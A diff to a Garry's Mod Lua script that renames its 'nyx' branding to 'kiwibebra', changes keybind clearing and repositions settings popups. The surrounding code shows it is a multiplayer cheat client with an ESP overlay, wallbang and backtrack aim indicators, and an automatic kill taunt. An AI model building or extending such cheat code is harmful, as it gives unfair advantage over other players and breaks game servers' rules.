@@ -8775,25 +9752,25 @@ do
         end
     end)
 
-    -- nyx_model self|others <name or path>; no argument lists the installed names
+    -- kiwibebra_model self|others <name or path>; no argument lists the installed names
     -- result in the console and the chat (the console is easy to miss)
     function M.Say(ok, text)
         local col = ok and Color(149, 184, 6) or Color(255, 80, 80)
-        MsgC(col, "[nyx] ", color_white, text .. "\n")
-        chat.AddText(col, "[nyx] ", color_white, text)
+        MsgC(col, "[kiwibebra] ", color_white, text .. "\n")
+        chat.AddText(col, "[kiwibebra] ", color_white, text)
     end
     local Say = M.Say
 
-    -- The folder for your own models: addons/nyx_models (models/player + materials/models/player
+    -- The folder for your own models: addons/kiwibebra_models (models/player + materials/models/player
     -- inside). Lua can't open Explorer, so its full path goes to the clipboard for Win+R.
     -- The install path comes from gameinfo.txt, which always sits in garrysmod/.
     function M.CopyFolder()
         local dir
         local ok, full = pcall(util.RelativePathToFull, "gameinfo.txt")
         if ok and isstring(full) and full ~= "" and full ~= "gameinfo.txt" then
-            dir = string.gsub(full, "[/\\]gameinfo%.txt$", "") .. "\\addons\\nyx_models"
+            dir = string.gsub(full, "[/\\]gameinfo%.txt$", "") .. "\\addons\\kiwibebra_models"
         else
-            dir = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\GarrysMod\\garrysmod\\addons\\nyx_models"
+            dir = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\GarrysMod\\garrysmod\\addons\\kiwibebra_models"
         end
         dir = string.gsub(dir, "/", "\\")
 
@@ -8878,12 +9855,12 @@ do
 
     -- The path is taken from the whole argument string, not args[2]: the console tokenizer
     -- splits quoted / Windows paths into pieces.
-    concommand.Add("nyx_model", function(_, _, args, argStr)
+    concommand.Add("kiwibebra_model", function(_, _, args, argStr)
         local which = string.lower(args[1] or "")
         local what = string.Trim(string.sub(argStr or "", #(args[1] or "") + 1))
 
         if which ~= "self" and which ~= "others" then
-            MsgC(Color(149, 184, 6), "[nyx] ", color_white, "nyx_model self|others <name or models/...mdl>\n")
+            MsgC(Color(149, 184, 6), "[kiwibebra] ", color_white, "kiwibebra_model self|others <name or models/...mdl>\n")
             for _, e in ipairs(M.List()) do print("  " .. e[1] .. "  " .. e[2]) end
             return
         end
@@ -9334,8 +10311,8 @@ local matBeam  = Material("effects/laser1")
 local matShiny = Material("models/shiny")
 local matWhite = Material("models/debug/debugwhite")
 
-surface.CreateFont("NyxKillFx", {font = "Verdana", size = 30, weight = 800, antialias = true})
-surface.CreateFont("NyxKillFxSmall", {font = "Verdana", size = 15, weight = 600, antialias = true})
+surface.CreateFont("KiwibebraKillFx", {font = "Verdana", size = 30, weight = 800, antialias = true})
+surface.CreateFont("KiwibebraKillFxSmall", {font = "Verdana", size = 15, weight = 600, antialias = true})
 
 local STREAK_TEXT = {"KILL", "DOUBLE KILL", "TRIPLE KILL", "MULTI KILL", "MEGA KILL", "ULTRA KILL", "MONSTER KILL"}
 
@@ -9355,10 +10332,10 @@ end
 -- the ragdoll of the victim is painted by a render override: it only draws differently while no
 -- screengrab is being taken, and nothing is written into the entity itself
 local function RagdollRender(self)
-    local fx = self.nyxFx
+    local fx = self.kiwibebraFx
 
     -- turned to particles: nothing is left to draw
-    if self.nyxHide and KFX.alive and not IsHidden() then return end
+    if self.kiwibebraHide and KFX.alive and not IsHidden() then return end
 
     if not KFX.alive or not fx or IsHidden() then
         self:DrawModel()
@@ -9438,7 +10415,7 @@ local function PaintRagdoll(victim)
 
         if IsValid(rag) then
             fx.born = CurTime()
-            rag.nyxFx = fx
+            rag.kiwibebraFx = fx
 
             if mode == "dissolve" then rag:SetRenderMode(RENDERMODE_TRANSCOLOR) end
             rag.RenderOverride = RagdollRender
@@ -9630,7 +10607,7 @@ KFX.mats = {
     energy = Material("models/props_combine/portalball001_sheet"),
 }
 
-surface.CreateFont("NyxKillFxBig", {font = "Verdana", size = 58, weight = 900, antialias = true})
+surface.CreateFont("KiwibebraKillFxBig", {font = "Verdana", size = 58, weight = 900, antialias = true})
 
 -- rolls everything random of the extra effects into e (drawing only replays it)
 function KFX.SpawnExtra(e, k, victim)
@@ -9803,7 +10780,7 @@ function KFX.SpawnDisint(e, k, victim)
             if IsValid(rag) then
                 d.filter[#d.filter + 1] = rag
                 if not k.dsHide then return end
-                rag.nyxHide = true
+                rag.kiwibebraHide = true
                 rag.RenderOverride = RagdollRender
             elseif tries < 14 then
                 timer.Simple(0.05, Try)
@@ -9822,6 +10799,10 @@ function KFX.DrawDisint(e, t, k)
     local anchor, col = d.anchor, d.col
     local mid = anchor + d.c
 
+    -- the particles take the effect colour with "in effect color", and always with Rainbow (it
+    -- cycles through them); with Rainbow the beam and the bloom cycle too
+    local tinted = k.dsTint or k.rainbow
+
     -- golden beam from just under your view to the body, gone in 0.7 s
     if k.dsBeam and t < 0.7 then
         local a = 1 - t / 0.7
@@ -9829,7 +10810,7 @@ function KFX.DrawDisint(e, t, k)
         local from = EyePos() + ang:Forward() * 24 - ang:Up() * 14
 
         render.SetMaterial(matBeam)
-        render.DrawBeam(from, mid, 18 * s * a, 0, 1, Color(255, 200, 80, 220 * a))
+        render.DrawBeam(from, mid, 18 * s * a, 0, 1, k.rainbow and FxColor(0, 220 * a) or Color(255, 200, 80, 220 * a))
         render.DrawBeam(from, mid, 6 * s * a, 0, 1, Color(255, 250, 220, 255 * a))
     end
 
@@ -9839,7 +10820,8 @@ function KFX.DrawDisint(e, t, k)
     local bloom = inA * math.Clamp(1 - (t - hold) / 0.3, 0, 1)
     if bloom > 0 then
         for z = 6, 66, 12 do
-            render.DrawSprite(anchor + Vector(d.c.x, d.c.y, z), 64, 64, Color(255, 255, 255, 110 * bloom))
+            local bc = k.rainbow and FxColor(z, 110 * bloom) or Color(255, 255, 255, 110 * bloom)
+            render.DrawSprite(anchor + Vector(d.c.x, d.c.y, z), 64, 64, bc)
         end
     end
 
@@ -9899,7 +10881,7 @@ function KFX.DrawDisint(e, t, k)
         end
 
         if a > 0 then
-            if k.dsTint then
+            if tinted then
                 render.DrawSprite(pos, size, size, FxColor(i, 255 * a))
             else
                 col.a = 255 * a
@@ -10099,11 +11081,11 @@ function KFX.Draw2DExtra(e, t, k, sw, sh, newest)
         m:Scale(Vector(pop, pop, 1))
 
         cam.PushModelMatrix(m)
-        draw.SimpleTextOutlined(e.label, "NyxKillFxBig", 0, 0, FxColor(1, 255 * a),
+        draw.SimpleTextOutlined(e.label, "KiwibebraKillFxBig", 0, 0, FxColor(1, 255 * a),
             TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 3, Color(0, 0, 0, 200 * a))
         cam.PopModelMatrix()
 
-        draw.SimpleTextOutlined(e.name, "NyxKillFxSmall", sw / 2, y + 36, Color(255, 255, 255, 220 * a),
+        draw.SimpleTextOutlined(e.name, "KiwibebraKillFxSmall", sw / 2, y + 36, Color(255, 255, 255, 220 * a),
             TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, Color(0, 0, 0, 200 * a))
     end
 end
@@ -10237,9 +11219,9 @@ AddHook("HUDPaint", "killfx", function()
             if sp.visible then
                 local a = 255 * math.Clamp(1 - (t / k.life) ^ 2, 0, 1)
 
-                draw.SimpleTextOutlined(e.label, "NyxKillFx", sp.x, sp.y, FxColor(1, a),
+                draw.SimpleTextOutlined(e.label, "KiwibebraKillFx", sp.x, sp.y, FxColor(1, a),
                     TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM, 2, Color(0, 0, 0, a))
-                draw.SimpleTextOutlined(e.name, "NyxKillFxSmall", sp.x, sp.y + 2, Color(255, 255, 255, a),
+                draw.SimpleTextOutlined(e.name, "KiwibebraKillFxSmall", sp.x, sp.y + 2, Color(255, 255, 255, a),
                     TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, Color(0, 0, 0, a))
             end
         end
@@ -10271,15 +11253,15 @@ MV.rain = {
     trace = {output = {}},
     CELL = 16, BAND = 128,
     mats = {
-        streak = CreateMaterial("nyx_rain_streak", "UnlitGeneric", {
+        streak = CreateMaterial("kiwibebra_rain_streak", "UnlitGeneric", {
             ["$basetexture"] = "effects/laser1", ["$vertexcolor"] = 1, ["$vertexalpha"] = 1,
             ["$additive"] = 1, ["$nocull"] = 1,
         }),
-        solid = CreateMaterial("nyx_rain_solid", "UnlitGeneric", {
+        solid = CreateMaterial("kiwibebra_rain_solid", "UnlitGeneric", {
             ["$basetexture"] = "vgui/white", ["$vertexcolor"] = 1, ["$vertexalpha"] = 1,
             ["$translucent"] = 1, ["$nocull"] = 1,
         }),
-        lineAdd = CreateMaterial("nyx_rain_lineadd", "UnlitGeneric", {
+        lineAdd = CreateMaterial("kiwibebra_rain_lineadd", "UnlitGeneric", {
             ["$basetexture"] = "vgui/white", ["$vertexcolor"] = 1, ["$vertexalpha"] = 1,
             ["$additive"] = 1, ["$nocull"] = 1,
         }),
@@ -10727,7 +11709,7 @@ local function DoKillsay(victimName)
     end
 
     if #pool == 0 then
-        killsayInfo = "empty: set text with nyx_killsay"
+        killsayInfo = "empty: set text with kiwibebra_killsay"
         return
     end
 
@@ -10762,8 +11744,8 @@ AddHook("AddDeathNotice", "killsay", function(attacker, attackerTeam, inflictor,
     if attacker == nick and victim ~= nick then DoKillsay(victim) end
 end)
 
--- custom line: nyx_killsay <text>, {name} is replaced with the victim's name
-concommand.Add("nyx_killsay", function(ply, cmd, args, argStr)
+-- custom line: kiwibebra_killsay <text>, {name} is replaced with the victim's name
+concommand.Add("kiwibebra_killsay", function(ply, cmd, args, argStr)
     cfg.killsay.custom = argStr or ""
     cfg.killsay.set = "custom"
     killsayInfo = "custom text set"
@@ -10886,11 +11868,11 @@ AddHook("HUDPaint", "esp", function()
             end
 
             if world.name then
-                draw.SimpleTextOutlined(WorldLabel(e, entry.cat), "NyxESP", x + w / 2, y - 3, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM, 1, COL_BLACK)
+                draw.SimpleTextOutlined(WorldLabel(e, entry.cat), "KiwibebraESP", x + w / 2, y - 3, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM, 1, COL_BLACK)
             end
 
             if world.distance then
-                draw.SimpleTextOutlined(math.floor(metres) .. "m", "NyxESP", x + w / 2, y + h + 2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, COL_BLACK)
+                draw.SimpleTextOutlined(math.floor(metres) .. "m", "KiwibebraESP", x + w / 2, y + h + 2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, COL_BLACK)
             end
         end
     end
@@ -10925,7 +11907,7 @@ AddHook("HUDPaint", "esp", function()
             if lastAimWall then
                 surface.SetDrawColor(255, 170, 40, 255)
                 surface.DrawRect(sp.x - 2, sp.y - 2, 5, 5)
-                draw.SimpleText("wallbang", "NyxESP", sp.x, sp.y + 8, Color(255, 170, 40), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
+                draw.SimpleText("wallbang", "KiwibebraESP", sp.x, sp.y + 8, Color(255, 170, 40), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
             else
                 surface.SetDrawColor(255, 60, 60, 255)
                 surface.DrawRect(sp.x - 2, sp.y - 2, 5, 5)
@@ -10933,7 +11915,7 @@ AddHook("HUDPaint", "esp", function()
 
             -- shot at an older position of the target (backtrack)
             if lastAimBT then
-                draw.SimpleText(string.format("backtrack %dms", lastAimBT), "NyxESP", sp.x, sp.y + (lastAimWall and 20 or 8),
+                draw.SimpleText(string.format("backtrack %dms", lastAimBT), "KiwibebraESP", sp.x, sp.y + (lastAimWall and 20 or 8),
                     Color(90, 200, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
             end
         end
@@ -10992,9 +11974,9 @@ end)
 --   small arrow on the row  : settings dropdown of that feature
 -- ---------------------------------------------------------------------------
 
-surface.CreateFont("NyxUI", {font = "Verdana", size = 12, weight = 400, antialias = false})
-surface.CreateFont("NyxUIBold", {font = "Verdana", size = 12, weight = 700, antialias = false})
-surface.CreateFont("NyxUISmall", {font = "Verdana", size = 11, weight = 400, antialias = false})
+surface.CreateFont("KiwibebraUI", {font = "Verdana", size = 12, weight = 400, antialias = false})
+surface.CreateFont("KiwibebraUIBold", {font = "Verdana", size = 12, weight = 700, antialias = false})
+surface.CreateFont("KiwibebraUISmall", {font = "Verdana", size = 11, weight = 400, antialias = false})
 
 local C = {
     bg          = Color(13, 13, 13),
@@ -11051,12 +12033,17 @@ end
 local lastTab = 1
 local binding = nil     -- keybind widget currently waiting for a key
 
--- Bind finished, or cancelled with ESC. Fed from three sources (polling, key events on the
--- menu, mouse capture on the bind widget) so a press is picked up whichever one sees it.
+-- Bind finished, cleared with DEL (back to NONE), or cancelled with ESC (left as it was). Fed
+-- from three sources (polling, key events on the menu, mouse capture on the bind widget) so a
+-- press is picked up whichever one sees it.
 local function FinishBinding(code)
     if not binding then return end
 
-    if code ~= KEY_ESCAPE and code ~= KEY_INSERT then
+    if code == KEY_DELETE then
+        -- feature binds keep "no key" as nil, key settings in cfg as KEY_NONE (configs need a number)
+        local t, k = binding.tbl, binding.key
+        if t.mode ~= nil then t[k] = nil else t[k] = KEY_NONE end
+    elseif code ~= KEY_ESCAPE and code ~= KEY_INSERT then
         binding.tbl[binding.key] = code
     end
 
@@ -11098,10 +12085,10 @@ end
 -- A rage head, B crosshair, C half sun, D gears, E karambit, F person, G crossed-out head,
 -- and the ones added to it: H double chevron, I floppy disk, J cube, K </>.
 -- Without the file GMod draws the plain letter instead, so it shows at once when it's missing.
-surface.CreateFont("NyxIcons", {font = "menu_font", extended = true, size = 38, weight = 100, antialias = true})
+surface.CreateFont("KiwibebraIcons", {font = "menu_font", extended = true, size = 38, weight = 100, antialias = true})
 
 function ANIM.Glyph(ch, cx, cy, col)     -- on ANIM: the main chunk is at Lua's 200 locals
-    draw.SimpleText(ch, "NyxIcons", cx, cy, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+    draw.SimpleText(ch, "KiwibebraIcons", cx, cy, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
 end
 
 local ICONS = {
@@ -11133,7 +12120,7 @@ local MOUSE_NAMES = {
 }
 
 local function KeyName(k)
-    if not k then return "NONE" end
+    if not k or k == KEY_NONE then return "NONE" end
     return MOUSE_NAMES[k] or string.upper(input.GetKeyName(k) or ("KEY" .. k))
 end
 
@@ -11159,11 +12146,11 @@ local function NewGroup(col, title)
         surface.SetDrawColor(C.groupBorder)
         surface.DrawOutlinedRect(0, 6, w, h - 6, 1)
 
-        surface.SetFont("NyxUIBold")
+        surface.SetFont("KiwibebraUIBold")
         local tw = surface.GetTextSize(title)
         surface.SetDrawColor(C.bg)
         surface.DrawRect(8, 0, tw + 8, 14)
-        draw.SimpleText(title, "NyxUIBold", 12, 0, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+        draw.SimpleText(title, "KiwibebraUIBold", 12, 0, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
     end
 
     SEARCH.Register(title, g, "group")
@@ -11211,7 +12198,7 @@ local function AddCheck(g, text, tbl, key, settings)
 
         surface.SetDrawColor(C.boxBorder)
         surface.DrawOutlinedRect(0, 3, 9, 9, 1)
-        draw.SimpleText(text, "NyxUI", 17 + hot * 2, h / 2, ANIM.Mix(C.text, C.textHi, hot), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+        draw.SimpleText(text, "KiwibebraUI", 17 + hot * 2, h / 2, ANIM.Mix(C.text, C.textHi, hot), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
 
         local right = w
         if settings then
@@ -11235,7 +12222,7 @@ local function AddCheck(g, text, tbl, key, settings)
         -- bind indicator, e.g. [hold MOUSE4]
         local e = GetBind(tbl, key, false)
         if e and e.mode ~= "always" and e.code then
-            draw.SimpleText("[" .. MODE_SHORT[e.mode] .. " " .. KeyName(e.code) .. "]", "NyxUISmall", right, h / 2, C.accent, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
+            draw.SimpleText("[" .. MODE_SHORT[e.mode] .. " " .. KeyName(e.code) .. "]", "KiwibebraUISmall", right, h / 2, C.accent, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
         end
     end
 
@@ -11293,7 +12280,7 @@ local function AddSlider(g, text, tbl, key, min, max, dec, suffix)
     local shown = nil                    -- eased fill, so the bar glides to a new value
 
     p.Paint = function(self, w, h)
-        draw.SimpleText(text, "NyxUI", 0, 0, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+        draw.SimpleText(text, "KiwibebraUI", 0, 0, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
 
         local frac = math.Clamp((tbl[key] - min) / (max - min), 0, 1)
         shown = shown and ANIM.Step(shown, frac, 18) or frac
@@ -11305,7 +12292,7 @@ local function AddSlider(g, text, tbl, key, min, max, dec, suffix)
         surface.SetDrawColor(C.boxBorder)
         surface.DrawOutlinedRect(0, 16, w, 12, 1)
 
-        draw.SimpleText(string.format("%." .. dec .. "f%s", tbl[key], suffix), "NyxUISmall", w / 2, 22, C.textHi, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+        draw.SimpleText(string.format("%." .. dec .. "f%s", tbl[key], suffix), "KiwibebraUISmall", w / 2, 22, C.textHi, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
     end
 
     p.OnMousePressed = function(self, code)
@@ -11341,7 +12328,7 @@ local function AddList(g, text, tbl, key, choices)
     end
 
     p.Paint = function(self, w, h)
-        draw.SimpleText(text, "NyxUI", 0, 0, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+        draw.SimpleText(text, "KiwibebraUI", 0, 0, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
 
         surface.SetDrawColor(C.field)
         surface.DrawRect(0, 16, w, h - 16)
@@ -11367,7 +12354,7 @@ local function AddList(g, text, tbl, key, choices)
             end
 
             local col = ANIM.Mix(ANIM.Mix(C.textDim, C.textHi, rowHot[i]), C.accent, rowSel[i])
-            draw.SimpleText("- " .. choice[1], "NyxUI", 8 + rowHot[i] * 2 + rowSel[i] * 2, y, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+            draw.SimpleText("- " .. choice[1], "KiwibebraUI", 8 + rowHot[i] * 2 + rowSel[i] * 2, y, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
         end
     end
 
@@ -11386,7 +12373,7 @@ local function AddKeybind(g, text, tbl, key)
     p:SetCursor("hand")
 
     p.Paint = function(self, w, h)
-        draw.SimpleText(text, "NyxUI", 0, h / 2, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+        draw.SimpleText(text, "KiwibebraUI", 0, h / 2, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
 
         local waiting = binding and binding.panel == self
         local label = waiting and "..." or KeyName(tbl[key])
@@ -11396,7 +12383,7 @@ local function AddKeybind(g, text, tbl, key)
         surface.DrawRect(w - bw, 0, bw, h)
         surface.SetDrawColor(C.groupBorder)
         surface.DrawOutlinedRect(w - bw, 0, bw, h, 1)
-        draw.SimpleText("[ " .. label .. " ]", "NyxUI", w - bw / 2, h / 2, waiting and C.accent or C.text, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+        draw.SimpleText("[ " .. label .. " ]", "KiwibebraUI", w - bw / 2, h / 2, waiting and C.accent or C.text, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
     end
 
     p.OnMousePressed = function(self, code)
@@ -11439,7 +12426,7 @@ local function AddButton(g, text, fn)
         surface.SetDrawColor(border)
         surface.DrawOutlinedRect(0, 0, w, h, 1)
 
-        draw.SimpleText(text, "NyxUI", w / 2, h / 2, ANIM.Mix(C.text, C.textHi, hot), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+        draw.SimpleText(text, "KiwibebraUI", w / 2, h / 2, ANIM.Mix(C.text, C.textHi, hot), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
     end
 
     p.OnMousePressed = function(self, code)
@@ -11594,7 +12581,7 @@ local function AddColorPicker(g, tbl, rk, gk, bk)
         surface.SetDrawColor(C.boxBorder)
         surface.DrawOutlinedRect(0, py, 40, 16, 1)
 
-        draw.SimpleText(string.format("#%02X%02X%02X   %d  %d  %d", r, gg, b, r, gg, b), "NyxUISmall", 48, py + 8, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+        draw.SimpleText(string.format("#%02X%02X%02X   %d  %d  %d", r, gg, b, r, gg, b), "KiwibebraUISmall", 48, py + 8, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
     end
 
     p.OnMousePressed = function(self, code)
@@ -11629,7 +12616,7 @@ local function AddColor(g, text, tbl, rk, gk, bk)
     p:SetCursor("hand")
 
     p.Paint = function(self, w, h)
-        draw.SimpleText(text, "NyxUI", 0, h / 2, self:IsHovered() and C.textHi or C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+        draw.SimpleText(text, "KiwibebraUI", 0, h / 2, self:IsHovered() and C.textHi or C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
 
         local bw = 38
         surface.SetDrawColor(tbl[rk], tbl[gk], tbl[bk], 255)
@@ -11847,15 +12834,50 @@ function ANIM.GrpDrag(g)
     end
 end
 
+-- Where a settings / colour popup goes: its own window beside the menu (right of it, left when
+-- the screen has no room there), so the menu stays visible while you tune. Kept as an offset
+-- from the menu, so it follows when the menu is dragged. y follows the mouse, kept on screen.
+function ANIM.PopupSpot(width, height, my, besides)
+    local mx0, my0 = menu:GetPos()
+    local bx, bw = mx0, menu:GetWide()
+    if IsValid(besides) then bx, bw = besides:GetPos(), besides:GetWide() end
+
+    local x = bx + bw + 8
+    if x + width > ScrW() - 4 then x = bx - width - 8 end
+    if x < 4 then x = math.Clamp(gui.MouseX(), 4, ScrW() - width - 4) end
+
+    local y = math.Clamp(my - 14, 4, math.max(4, ScrH() - height - 4))
+    return x - mx0, y - my0
+end
+
+-- a popup window's Think part shared by both kinds: gone with the menu, glued to it
+function ANIM.PopupFollow(self)
+    if not IsValid(menu) or menu.closing then
+        self:Remove()
+        return false
+    end
+
+    self.fade = ANIM.Step(self.fade, 1, 14)
+    self:SetAlpha(255 * self.fade * (menu.fade or 1))
+
+    local mx0, my0 = menu:GetPos()
+    self:SetPos(mx0 + self.relX, my0 + self.relY + (1 - self.fade) * 8)
+    return true
+end
+
 -- build(p) fills the popup with the same widgets the tab groups use
 local function OpenPopup(title, width, build)
+    -- reopened with the same title (a tab inside it rebuilt it): it stays where it was
+    local keep = IsValid(popup) and popup.title == title and {popup.relX, popup.relY}
+
     ClosePopup()
     if not IsValid(menu) then return end
 
-    local mx, my = gui.MouseX(), gui.MouseY()
+    local my = gui.MouseY()
 
-    local p = vgui.Create("Panel", menu)
+    local p = vgui.Create("Panel")
     popup = p
+    p.title = title
     p:SetSize(width, 60)
     p.cy = 28
 
@@ -11866,30 +12888,30 @@ local function OpenPopup(title, width, build)
         surface.DrawOutlinedRect(0, 0, w, h, 1)
         surface.SetDrawColor(C.accent)
         surface.DrawRect(1, 1, w - 2, 1)
-        draw.SimpleText(title, "NyxUIBold", 10, 8, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+        draw.SimpleText(title, "KiwibebraUIBold", 10, 8, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
     end
 
     build(p)
     p:SetTall(p.cy + 6)
 
-    local fx, fy = menu:ScreenToLocal(mx, my)
-    p:SetPos(
-        math.Clamp(fx, 4, menu:GetWide() - width - 4),
-        math.Clamp(fy, 4, menu:GetTall() - p:GetTall() - 4)
-    )
-    p:MoveToFront()
+    -- its own window: it needs the mouse, the keyboard stays with the menu (bind capture)
+    p:MakePopup()
+    p:SetKeyboardInputEnabled(false)
+
+    if keep then
+        p.relX, p.relY = keep[1], keep[2]
+    else
+        p.relX, p.relY = ANIM.PopupSpot(width, p:GetTall(), my)
+    end
 
     -- close on a click outside; the click that opened us is still down, so wait for its release
     -- fades in (and drifts up a little) when it opens
-    p.fade = 0
+    p.fade = keep and 1 or 0
     p:SetAlpha(0)
-    local popupY = p:GetY()
 
     p.wasDown = true
     p.Think = function(self)
-        self.fade = ANIM.Step(self.fade, 1, 14)
-        self:SetAlpha(255 * self.fade)
-        self:SetY(popupY + (1 - self.fade) * 8)
+        if not ANIM.PopupFollow(self) then return end
 
         local down = input.IsMouseDown(MOUSE_LEFT) or input.IsMouseDown(MOUSE_RIGHT)
 
@@ -11938,9 +12960,9 @@ OpenColorPopup = function(title, build)
     if IsValid(colorPopup) then colorPopup:Remove() end
 
     local width = 230
-    local mx, my = gui.MouseX(), gui.MouseY()
+    local my = gui.MouseY()
 
-    local p = vgui.Create("Panel", menu)
+    local p = vgui.Create("Panel")
     colorPopup = p
     p:SetSize(width, 60)
     p.cy = 28
@@ -11952,37 +12974,30 @@ OpenColorPopup = function(title, build)
         surface.DrawOutlinedRect(0, 0, w, h, 1)
         surface.SetDrawColor(C.accent)
         surface.DrawRect(1, 1, w - 2, 1)
-        draw.SimpleText(title, "NyxUIBold", 10, 8, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+        draw.SimpleText(title, "KiwibebraUIBold", 10, 8, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
     end
 
     build(p)
     p:SetTall(p.cy + 6)
 
-    local x, y
-    if IsValid(popup) then
-        local px, py = popup:GetPos()
-        x, y = px + popup:GetWide() + 6, py
-        if x + width > menu:GetWide() - 4 then x = px - width - 6 end
-    else
-        x, y = menu:ScreenToLocal(mx, my)
-    end
+    p:MakePopup()
+    p:SetKeyboardInputEnabled(false)
 
-    p:SetPos(
-        math.Clamp(x, 4, menu:GetWide() - width - 4),
-        math.Clamp(y, 4, menu:GetTall() - p:GetTall() - 4)
-    )
-    p:MoveToFront()
+    -- beside the settings popup it came from (or beside the menu), outside the menu
+    if IsValid(popup) then
+        local _, py = popup:GetPos()
+        p.relX, p.relY = ANIM.PopupSpot(width, p:GetTall(), py + 14, popup)
+    else
+        p.relX, p.relY = ANIM.PopupSpot(width, p:GetTall(), my)
+    end
 
     -- fades in (and drifts up a little) when it opens
     p.fade = 0
     p:SetAlpha(0)
-    local popupY = p:GetY()
 
     p.wasDown = true
     p.Think = function(self)
-        self.fade = ANIM.Step(self.fade, 1, 14)
-        self:SetAlpha(255 * self.fade)
-        self:SetY(popupY + (1 - self.fade) * 8)
+        if not ANIM.PopupFollow(self) then return end
 
         local down = input.IsMouseDown(MOUSE_LEFT) or input.IsMouseDown(MOUSE_RIGHT)
 
@@ -12082,8 +13097,8 @@ function ESPL.OpenElementMenu(f, id)
         surface.DrawOutlinedRect(0, 0, w, h, 1)
         surface.SetDrawColor(C.accent)
         surface.DrawRect(1, 1, w - 2, 1)
-        draw.SimpleText(e.label, "NyxUIBold", 10, 8, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
-        draw.SimpleText(ESPL.Side(id), "NyxUISmall", w - 10, 9, C.textDim, TEXT_ALIGN_RIGHT, TEXT_ALIGN_TOP)
+        draw.SimpleText(e.label, "KiwibebraUIBold", 10, 8, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+        draw.SimpleText(ESPL.Side(id), "KiwibebraUISmall", w - 10, 9, C.textDim, TEXT_ALIGN_RIGHT, TEXT_ALIGN_TOP)
     end
 
     AddCheck(p, (id == "hp" or id == "hpbar") and "Auto (green .. red by health)" or "Auto (the ESP colour)", c, "auto")
@@ -12219,8 +13234,8 @@ function ESPL.OpenEditor()
             surface.SetDrawColor(r, g, b, 255)
             surface.DrawRect(gx, 1, 2, 2)
         end
-        draw.SimpleText("ESP editor", "NyxUIBold", 10, 9, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
-        draw.SimpleText("drag / right click", "NyxUISmall", 82, 10, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+        draw.SimpleText("ESP editor", "KiwibebraUIBold", 10, 9, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+        draw.SimpleText("drag / right click", "KiwibebraUISmall", 82, 10, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
     end
 
     -- reset (top right)
@@ -12229,7 +13244,7 @@ function ESPL.OpenEditor()
     reset:SetSize(42, 18)
     reset:SetCursor("hand")
     reset.Paint = function(self, w, h)
-        draw.SimpleText("reset", "NyxUISmall", w / 2, h / 2, self:IsHovered() and C.textHi or C.textDim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+        draw.SimpleText("reset", "KiwibebraUISmall", w / 2, h / 2, self:IsHovered() and C.textHi or C.textDim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
     end
     reset.OnMousePressed = function()
         cfg.espl = table.Copy(ESPL.defaults.espl)
@@ -12379,9 +13394,9 @@ function ESPL.OpenEditor()
         surface.DrawRect(0, 0, w, h)
         surface.SetDrawColor(ESPL.drag and C.accent or C.groupBorder)
         surface.DrawOutlinedRect(0, 0, w, h, 1)
-        draw.SimpleText("Drag & Drop Elements", "NyxUIBold", 8, 6, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+        draw.SimpleText("Drag & Drop Elements", "KiwibebraUIBold", 8, 6, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
 
-        surface.SetFont("NyxUI")
+        surface.SetFont("KiwibebraUI")
         local x, y = 8, 26
         local chips = {}
         local cx, cy = self:CursorPos()
